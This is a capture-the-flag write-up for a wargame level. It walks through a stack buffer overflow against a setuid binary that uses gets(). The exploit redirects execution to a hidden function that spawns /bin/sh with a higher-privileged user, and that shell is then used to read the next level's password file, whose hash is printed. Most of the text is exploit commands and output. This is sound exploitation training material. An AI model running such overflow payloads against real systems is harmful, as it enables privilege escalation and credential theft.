ll
|
L-> -rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1*

./level1

we got an input where we can write somethings without any return

let's check what function is called to get that

gdb level1

(gdb) disass main
|
L->  0x08048490 <+16>:    call   0x8048340 <gets@plt>

oh it's use gets, I remember that we can buffer overflow on this

(gdb) quit

we have python installed on the machine, let's try to find were it broke

python -c 'print "a"*100' | ./level1
|
L-> Segfault

python -c 'print "a"*50' | ./level1

nothing

python -c 'print "a"*75' | ./level1
|
L-> nothing

python -c 'print "a"*85' | ./level1
|
L-> Segfault

python -c 'print "a"*80' | ./level1
|
L-> Segfault

python -c 'print "a"*76' | ./level1
|
L-> Illegal instruction

here we go so now we need to inject some code but the disass main not reference any other function
let's try a objdump on it

objdump -d level1
|
L-> 08048444 <run>:
L-> 8048444:       55                      push   %ebp
L-> 8048445:       89 e5                   mov    %esp,%ebp
L-> 8048447:       83 ec 18                sub    $0x18,%esp
L-> 804844a:       a1 c0 97 04 08          mov    0x80497c0,%eax
L-> 804844f:       89 c2                   mov    %eax,%edx
L-> 8048451:       b8 70 85 04 08          mov    $0x8048570,%eax
L-> 8048456:       89 54 24 0c             mov    %edx,0xc(%esp)
L-> 804845a:       c7 44 24 08 13 00 00    movl   $0x13,0x8(%esp)
L-> 8048461:       00
L-> 8048462:       c7 44 24 04 01 00 00    movl   $0x1,0x4(%esp)
L-> 8048469:       00
L-> 804846a:       89 04 24                mov    %eax,(%esp)
L-> 804846d:       e8 de fe ff ff          call   8048350 <fwrite@plt>
L-> 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
L-> 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
L-> 804847e:       c9                      leave
L-> 804847f:       c3                      ret

wow we find a secret function we see that it's call fwrite() and system()

thank's to this website https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/ I learn how to exploit it

let's make this on practice

python -c 'print "a"*76 + "\x44\x84\x04\x08"' | ./level1
|
L-> Good... Wait what?
L-> Segmentation fault (core dumped)

okkk so we've got an output frome fwrite but what does system() execute ? let's find it

gdb level1

(gdb) x/s 0x8048584
|
L-> 0x8048584:       "/bin/sh"

(gdb) quit

ok so it make system("/bin/sh") but we don't have any output 
let's try to use cat - to have an infite loop on it and not exit the sh

python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/test

cat /tmp/test - | ./level1
|
L-> Good... Wait what?

okkk so we don't have any segfault bu we can write, let's check if we are in a shell

id
|
L-> uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)

greaaaat so we are in a shell with the level2 euid and groups
let's try to cat the .pass

cat /home/user/level2/.pass
|
L-> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

done :)